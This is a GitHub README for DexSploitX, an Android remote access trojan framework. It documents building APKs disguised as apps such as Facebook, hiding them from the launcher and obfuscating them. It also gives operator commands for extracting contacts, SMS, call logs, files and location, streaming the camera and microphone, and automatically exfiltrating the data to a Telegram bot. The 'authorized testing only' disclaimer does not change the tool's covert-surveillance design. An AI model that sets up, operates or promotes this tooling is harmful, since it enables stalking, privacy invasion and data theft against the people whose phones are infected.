# 🔥 DexSploitX - Advanced Android RAT Framework

<div align="center">

![Version](https://img.shields.io/badge/version-2.0-red.svg)
![Android](https://img.shields.io/badge/Android-5.0--16-green.svg)
![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![License](https://img.shields.io/badge/license-Educational-orange.svg)

**Professional Android Remote Access Tool for Authorized Security Testing**

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Documentation](#-documentation) • [Legal](#-legal-disclaimer)

</div>

---

## 📋 Overview

DexSploitX is a powerful Android Remote Access Tool (RAT) framework designed for professional penetration testers and security researchers. It provides comprehensive remote access capabilities for authorized security assessments on Android devices running versions 5.0 through 16 (API 21-36).

### 🎯 Key Highlights

- **Zero Configuration APK Builder** - Interactive builder with custom branding
- **Multi-Device Management** - Handle multiple connected devices simultaneously
- **Telegram Integration** - Auto-dump data to Telegram for remote operations
- **Stealth Operations** - Hide app from launcher, custom icons, package names
- **Advanced Permissions** - Granular permission selection (13+ permissions)
- **Live Monitoring** - Real-time SMS, location, camera, and audio streaming
- **File Operations** - Upload/download files, directory browsing
- **Code Protection** - Built-in obfuscation tools included

---

## ✨ Features

### 🔧 APK Builder
- **Interactive Configuration** - Easy-to-use command-line interface
- **Custom Branding** - Change app name, package, icon, and website
- **IP/Port Configuration** - Automatic server endpoint configuration
- **Permission Selection** - Choose exactly which permissions to request
- **Stealth Mode** - Hide app from launcher (no icon)
- **Telegram Auto-Dump** - Configure Telegram bot for data exfiltration
- **Automatic Signing** - Built-in APK signing with keystore management

### 📱 Remote Access Capabilities
- **Device Information** - Complete device specs and system info
- **Contact Access** - Extract all contacts with details
- **Call Logs** - View complete call history
- **SMS Management** - Read all messages + live SMS monitoring
- **Location Tracking** - GPS location with live updates
- **Camera Streaming** - Live camera feed (front/back)
- **Audio Recording** - Live microphone streaming
- **File Management** - Browse, upload, download files
- **App List** - View all installed applications
- **Vibration Control** - Remote device vibration
- **Sound Playback** - Play audio URLs remotely

### 🌐 Server Features
- **Multi-Session Management** - Handle multiple devices
- **Telegram Integration** - Auto-send data to Telegram bot
- **HTTP Server** - Built-in web interface for camera/audio
- **Persistent Connections** - Auto-reconnect on disconnect
- **Data Logging** - Automatic file saving for all data
- **Professional UI** - Clean command-line interface

---

## 🚀 Installation

### ⚠️ Important: Termux Users

**Building APKs on Termux has known compatibility issues** due to aapt2 binary incompatibility on aarch64 architecture.

**Recommended Workflow:**
1. **Build APKs on PC** (Windows/Linux/Mac) - Fast and stable
2. **Run Server on Termux** (Android device) - Portable and convenient

See [TERMUX_SETUP.md](TERMUX_SETUP.md) for detailed Termux instructions.

---

### Prerequisites
```bash
# Required
- Python 3.8 or higher
- Java JDK 8 or higher
- Android SDK (for apksigner/zipalign)

# Optional
- Pillow (for icon customization)
- PyArmor (for advanced obfuscation)
```

### Quick Setup (PC)
```bash
# Clone repository
git clone https://github.com/offsecnight/DexSploitX.git
cd DexSploitX

# Install dependencies
pip install -r requirements.txt

# Download apktool
cd Builder
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
```

### Quick Setup (Termux - Server Only)
```bash
# Install Termux from F-Droid
# Then run:
pkg update && pkg upgrade -y
pkg install -y python git
git clone https://github.com/offsecnight/DexSploitX.git
cd DexSploitX
pip install -r requirements.txt

# Start server
python DexSploitX.py -i 0.0.0.0 -p 8080
```

---

## 📖 Usage

### Step 1: Build APK

```bash
cd Builder
python build.py
```

**Configuration Options:**
- Server IP and Port
- App Name and Package
- Website URL
- Custom Icon
- Telegram Bot Token & Chat ID
- Hide App Option
- Permission Selection

**Example:**
```
[?] Server IP: 192.168.1.100
[?] Server Port: 4444
[?] App Name: Facebook
[?] Package: com.social.app
[?] Enable Telegram auto-dump? (y/n): y
[?] Telegram Bot Token: 123456:ABC-DEF...
[?] Telegram Chat ID: 987654321
[?] Hide app from launcher? (y/n): y
```

### Step 2: Start Server

```bash
python DexSploitX.py -i 0.0.0.0 -p 4444
```

### Step 3: Install APK

Transfer the APK from `APK/` folder to target device and install.

### Step 4: Interact with Device

```bash
DexSploitX > sessions              # List connected devices
DexSploitX > session DEVICE_NAME   # Select device
DexSploitX (DEVICE) > help         # Show available commands
```

---

## 🎮 Commands

### Session Management
```bash
sessions          # List all connected devices
session <name>    # Connect to specific device
back              # Return to main menu
deviceinfo        # Show device information
exit              # Exit DexSploitX
```

### Data Extraction
```bash
contacts          # Extract all contacts
calllogs          # Get call history
sms               # Read all SMS messages
applist           # List installed apps
location          # Get current GPS location
```

### Live Monitoring
```bash
livesms           # Start live SMS monitoring
stoplive          # Stop live SMS monitoring
camstream [back|front]  # Start camera stream
stopstream        # Stop camera stream
liveaudio         # Start audio recording
stopaudio         # Stop audio recording
```

### File Operations
```bash
ls [path]         # List directory contents
pwd               # Show current directory
cd <path>         # Change directory
dump <file>       # Download file
cat <file>        # View file contents
storage           # Show storage info
upload <file>     # Upload file to device
dumpdir <path>    # Download entire directory
```

### Device Control
```bash
vibrate [duration]     # Vibrate device (ms)
playsound <url>        # Play audio from URL
stopsound              # Stop audio playback
```

### Telegram Integration
```bash
dump-tg-bot <token> [chat_id]  # Configure Telegram bot
```

---

## 🔐 Telegram Integration

DexSploitX supports automatic data exfiltration to Telegram:

### Setup Telegram Bot

1. **Create Bot**: Message [@BotFather](https://t.me/botfather) on Telegram
2. **Get Token**: Copy the bot token (format: `123456:ABC-DEF...`)
3. **Get Chat ID**: Message [@userinfobot](https://t.me/userinfobot) to get your chat ID

### Configure During Build

```bash
[?] Enable Telegram auto-dump? (y/n): y
[?] Telegram Bot Token: YOUR_BOT_TOKEN
[?] Telegram Chat ID: YOUR_CHAT_ID
```

### Configure in Server

```bash
DexSploitX > dump-tg-bot YOUR_BOT_TOKEN YOUR_CHAT_ID
```

**Auto-Dump Features:**
- Contacts → Sent as document
- Call Logs → Sent as document
- SMS Messages → Sent as document
- App List → Sent as document
- Files → Sent as document
- Live SMS → Instant notification
- Location → Real-time updates

---

## � Project Structure

```
DexSploitX/
├── DexSploitX.py              # Main server
├── config.json                # Telegram configuration
├── requirements.txt           # Python dependencies
├── obfuscate_simple.py        # Simple obfuscator
├── obfuscate.py               # PyArmor obfuscator
├── README.md                  # This file
├── LICENSE                    # License file
├── DOCUMENTATION.md           # Detailed documentation
├── Builder/
│   ├── build.py               # APK builder
│   ├── apktool.jar            # APK decompiler
│   ├── facebook.png           # Default icon
│   └── stub/                  # Pre-built APK stub
│       ├── AndroidManifest.xml
│       ├── res/               # Resources
│       └── smali/             # Decompiled code
├── keystore/
│   └── keystore               # APK signing keystore
├── APK/                       # Built APKs output
└── devices/                   # Collected data storage
    └── DEVICE_NAME/
        ├── contacts.txt
        ├── calllogs.txt
        ├── sms_complete.txt
        ├── applist.txt
        ├── camera_frames/
        └── audio/
```

---

## 🎓 Documentation

### Detailed Guides
- [Complete Documentation](DOCUMENTATION.md) - Full feature documentation
- [Obfuscation Guide](OBFUSCATION_GUIDE.md) - Code protection guide
- [API Reference](API.md) - Developer API documentation

### Video Tutorials
- Installation & Setup
- Building Custom APKs
- Multi-Device Management
- Telegram Integration
- Advanced Features

---

## 🔧 Advanced Configuration

### Custom Keystore
```bash
keytool -genkey -v \
  -keystore keystore/keystore \
  -alias key0 \
  -keyalg RSA \
  -keysize 2048 \
  -validity 10000
```

### Custom Stub APK
Replace `Builder/stub/` with your own decompiled APK for custom base.

### Server Configuration
Edit `config.json` for persistent Telegram settings:
```json
{
    "telegram_bot_token": "YOUR_TOKEN",
    "telegram_chat_id": "YOUR_CHAT_ID"
}
```

---

## 🐛 Troubleshooting

### APK Build Fails
- Ensure Java is installed: `java -version`
- Check apktool.jar exists in Builder/
- Verify stub/ directory is complete

### Connection Issues
- Check firewall allows port
- Verify IP address is correct
- Ensure device has internet connection

### Permission Errors
- Grant all requested permissions manually
- Check Android version compatibility
- Disable battery optimization

### Telegram Not Working
- Verify bot token is correct
- Check chat ID is valid
- Ensure bot can send messages to you

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request

---

## 📜 Changelog

### Version 2.0 (Current)
- ✅ Complete rewrite with modern architecture
- ✅ Telegram integration for data exfiltration
- ✅ Interactive APK builder with all options
- ✅ Support for Android 5.0 - 16
- ✅ Live SMS and location monitoring
- ✅ Camera and audio streaming
- ✅ Multi-device session management
- ✅ Code obfuscation tools included
- ✅ Professional UI and branding

### Version 1.0
- Basic RAT functionality
- Single device support
- Manual configuration

---

## ⚠️ LEGAL DISCLAIMER

**READ CAREFULLY BEFORE USE**

This tool is provided for **EDUCATIONAL and AUTHORIZED SECURITY TESTING PURPOSES ONLY**.

### Authorized Use Only
- ✅ Penetration testing with written authorization
- ✅ Security research on owned devices
- ✅ Educational purposes in controlled environments
- ✅ Red team operations with proper authorization

### Prohibited Use
- ❌ Unauthorized access to devices
- ❌ Surveillance without consent
- ❌ Any illegal activities
- ❌ Violation of privacy laws

### Legal Responsibility
- **YOU** are solely responsible for your actions
- **YOU** must comply with all applicable laws
- **YOU** must obtain proper authorization before use
- **YOU** accept all legal consequences of misuse

### Developer Liability
The developer (NIGHTKING) assumes **NO RESPONSIBILITY** for:
- Misuse of this tool
- Damage caused by this tool
- Legal consequences of unauthorized use
- Violation of laws or regulations

### Terms of Use
By using DexSploitX, you agree to:
1. Use only for authorized and legal purposes
2. Obtain written permission before testing
3. Comply with all applicable laws and regulations
4. Accept full responsibility for your actions
5. Not hold the developer liable for any consequences

**UNAUTHORIZED ACCESS TO COMPUTER SYSTEMS IS ILLEGAL**

Violations may result in:
- Criminal prosecution
- Civil lawsuits
- Imprisonment
- Heavy fines

**USE AT YOUR OWN RISK**

---

## 📞 Contact & Support

### Developer
- **Name**: NIGHTKING
- **GitHub**: [@offsecnight](https://github.com/offsecnight)
- **Repository**: [DexSploitX](https://github.com/offsecnight/DexSploitX)

### Support
- **Issues**: [GitHub Issues](https://github.com/offsecnight/DexSploitX/issues)
- **Discussions**: [GitHub Discussions](https://github.com/offsecnight/DexSploitX/discussions)
- **Wiki**: [Project Wiki](https://github.com/offsecnight/DexSploitX/wiki)

### Community
- Join our community for updates and support
- Share your experiences and improvements
- Report bugs and request features

---

## 📄 License

This project is licensed under the **Educational Use License**.

See [LICENSE](LICENSE) file for details.

**Key Points:**
- Free for educational and research purposes
- Requires authorization for penetration testing
- No warranty provided
- Developer not liable for misuse

---

## 🌟 Acknowledgments

- Android Security Community
- Penetration Testing Community
- Open Source Contributors
- Security Researchers Worldwide

---

## 🔗 Related Projects

- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [AhMyth Android RAT](https://github.com/AhMyth/AhMyth-Android-RAT)
- [AndroRAT](https://github.com/DesignativeDave/androrat)

---

<div align="center">

**⭐ Star this repository if you find it useful!**

**Made with ❤️ by NIGHTKING**

**For Authorized Security Testing Only**

</div>
